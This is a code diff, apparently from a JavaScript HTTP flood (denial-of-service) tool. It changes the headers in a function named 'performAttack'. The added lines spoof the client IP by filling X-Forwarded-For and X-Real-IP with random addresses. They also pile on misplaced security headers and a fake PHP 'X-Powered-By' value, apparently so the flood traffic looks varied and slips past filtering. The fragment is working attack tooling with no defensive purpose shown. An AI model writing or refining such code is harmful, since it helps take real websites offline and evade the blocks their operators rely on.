@@ -111,14 +111,31 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
         "TE": "Trailers",
         "Accept-Encoding": "gzip, deflate, br",
         "Pragma": getRandomElement(cipherSuites),
-        "X-Forwarded-For": getRandomIP(),
+        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
         "Via": `1.1 ${Math.random().toString(36).substring(7)}`,
+        "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
         "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
         "Host": url.replace(/https?:\/\//, "").split("/")[0],
         "sec-fetch-site": "same-origin",
         "Sec-Fetch-User": "?1",
         "Origin": url.split("/").slice(0, 3).join("/"),
+        "X-XSS-Protection": "1; mode=block",
+        "X-Frame-Options": "DENY",
+        "X-Content-Type-Options": "nosniff",
+        "If-None-Match": '"W/"5c-1f7b"',
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Security-Policy": "default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'; object-src 'none';",
+        "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+        "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none';",
+        "Accept-Charset": "utf-8",
+        "Expires": "0",
+        "X-Content-Security-Policy": "default-src 'self';",
+        "X-Download-Options": "noopen",
+        "X-DNS-Prefetch-Control": "off",
+        "X-Permitted-Cross-Domain-Policies": "none",
+        "X-Powered-By": "PHP/7.4.3",
     };
+
 
 
     axios
